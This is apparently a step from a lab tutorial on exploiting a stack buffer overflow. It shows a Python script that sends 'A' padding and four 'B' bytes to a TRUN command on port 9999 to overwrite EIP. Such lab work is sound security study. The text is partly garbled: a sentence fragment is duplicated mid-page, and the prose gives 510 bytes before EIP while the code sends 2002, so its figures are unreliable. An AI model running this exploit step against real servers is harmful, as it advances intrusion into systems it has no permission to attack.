# Overwriting the EIP

In previous step, we successfully overflowed the buffer, which means that we have control over the data that will overwrite the `EIP` (Extended Instruction Pointer).

To proceed with overwriting the `EIP`, we need to consider that there are `510` bytes preceding the `EIP`. Therefore, we will send `510` bytes filled with 'A' characters to reach the `EIP`, followed by `4` bytes filled with 'B' characters to overwrite the `EIP`.
riting the `EIP`, w
```python
#!/bin/python

import sys
import socket
from time import sleep

shellcode = "A"* 2002 + "B"* 4
try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.40.135',9999))
      s.send(('TRUN / .:/' + shellcode))
      s.close()
except:
      print "Error connecting to server"
      sys.exit()
```
<p></p>

<img alt="" class="bg hc hd c" width="1000" height="620" loading="lazy" role="presentation" src="https://i.ibb.co/5YVvYKk/4-Overwrite-EIP.png"></img>

 The `EBP` (Extended Base Pointer) was filled with 'A's `(41414141)`, and the `EIP` was filled with 'B's `(42424242)`.


                         
              
